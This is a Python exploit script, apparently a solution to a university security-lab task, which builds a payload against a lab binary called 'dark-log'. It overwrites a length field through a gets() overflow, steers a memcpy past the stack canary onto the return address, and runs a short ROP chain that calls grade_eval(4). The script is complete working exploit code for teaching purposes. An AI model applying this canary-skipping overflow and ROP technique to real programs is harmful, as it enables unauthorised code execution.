#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

Goal: make dark-log call grade_eval(4) and print "Hope A will be your grade!"
even though the return address is protected by a stack canary.

`struct log_frame` in input() is

    char expression[128];   // rbp-0x120
    char logMsg[128];       // rbp-0xa0
    int  len;               // rbp-0x20
    char pad[8];            // rbp-0x18
    // canary at rbp-0x08, saved rbp at rbp+0x00, return address at rbp+0x08

gets() fills expression[] and then

    memcpy(f.logMsg + f.len, f.expression, sizeof(f.expression));

copies 128 bytes to logMsg + len.  `len` comes from our own input, so we can
aim that 128-byte copy past the canary:

    dest = rbp - 0xa0 + len  ==  rbp + 8   =>   len = 0xa8

The canary at rbp-0x08 is never written, so its check passes, while the
return address and eight slots above it are overwritten with bytes taken from
expression[0..127] - which is exactly the start of our input.

ROP chain written at rbp+8:
    [0] 0x4018a3  pop %rdi ; ret
    [1] 4
    [2] 0x4018b0  repz ret   (fix %rsp alignment for printf's movaps)
    [3] 0x401677  grade_eval
"""
import struct
import sys

LEN_SLOT = 256           # 0x120 - 0x20: offset of f.len from expression[0]
NEW_LEN = 0xA8           # rbp - 0xa0 + 0xa8 = rbp + 8 (return address)
POP_RDI = 0x4018A3       # pop %rdi ; ret
REPZ_RET = 0x4018B0      # repz ret
GRADE_EVAL = 0x401677

chain = b""
chain += struct.pack("<Q", POP_RDI)
chain += struct.pack("<Q", 4)
chain += struct.pack("<Q", REPZ_RET)
chain += struct.pack("<Q", GRADE_EVAL)

payload = chain.ljust(LEN_SLOT, b"A")
payload += struct.pack("<I", NEW_LEN)[:3]   # little endian 0xa8, NUL comes from gets

sys.stdout.buffer.write(payload + b"\n")
